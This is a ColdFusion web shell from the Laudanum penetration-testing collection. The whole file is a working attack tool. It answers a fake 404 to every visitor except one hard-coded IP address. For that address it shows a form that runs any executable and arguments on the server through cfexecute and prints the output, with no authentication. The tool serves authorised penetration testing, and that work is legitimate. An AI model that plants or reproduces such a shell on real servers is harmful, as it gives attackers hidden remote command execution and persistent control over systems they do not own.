<cfapplication scriptProtect="none">
<!---
/* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson <kjohnson@secureideas.net
***         Tim Medin <tim@securitywhole.com>
***
*** Copyright 2012 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides access to shell acces on the system.
*** Modified by Tim Medin
***
********************************************************************************
***
*** TODO: Fix the problem with quotes
***       Add authentication
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1^
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */
--->
<cfif #cgi.remote_addr# neq "1.1.1.1">
    <cfheader statuscode="404" statustext="Page Not Found" />
    <cfabort />
</cfif>

<html>
<head><title>Laudanum Coldfusion Shell</title></head>
<body>
<form action="shell.cfm" method="POST">
<cfif IsDefined("form.cmd")>
Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"> For Windows use: cmd.exe or the full path to cmd.exe<br>
Arguments: <Input type="text" name="arguments" value="<cfoutput>#HTMLEditFormat(form.arguments)#</cfoutput>"> For Windows use: /c <i>command</i><br>
<cfelse>
Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
Arguments: <Input type="text" name="arguments" value="/c "><br>
</cfif>
<input type="submit">
</form>

<cfif IsDefined("form.cmd")>
<pre>
<cfexecute name="#Replace(preservesinglequotes(form.cmd), QuoteMark, DoubleQuoteMark, 'All')#" arguments="#Replace(preservesinglequotes(form.arguments), QuoteMark, DoubleQuoteMark, 'All')#" timeout="5" variable="foo"></cfexecute>
<cfoutput>#Replace(foo, "<", "&lt;", "All")#</cfoutput>
</pre>
</cfif>
Note: The cold fusion command that executes shell commands strips quotes, both double and single, so be aware.

  <hr/>
  <address>
  Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>
</body>
</html>
